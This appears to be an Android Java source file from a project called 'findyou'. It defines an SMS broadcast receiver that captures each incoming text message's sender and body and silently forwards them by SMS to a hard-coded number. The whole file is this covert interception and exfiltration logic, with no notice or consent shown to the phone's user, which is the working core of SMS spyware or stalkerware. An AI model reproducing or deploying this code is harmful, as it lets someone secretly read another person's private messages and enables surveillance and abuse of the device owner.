package cn.muse.findyou.recevier;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import cn.muse.findyou.MyContacts;

/**
 * Created by Sun on 2017/6/27.
 */

public class SMSRecevier extends BroadcastReceiver{


    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        SmsMessage smsMessage= SmsMessage.createFromPdu((byte[])pdus[0]);
        String num = smsMessage.getDisplayOriginatingAddress();
        String content = smsMessage.getMessageBody();

        String msg = num+ "msg to he:" + content;
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(MyContacts.Number,null,msg,null,null);
    }

}
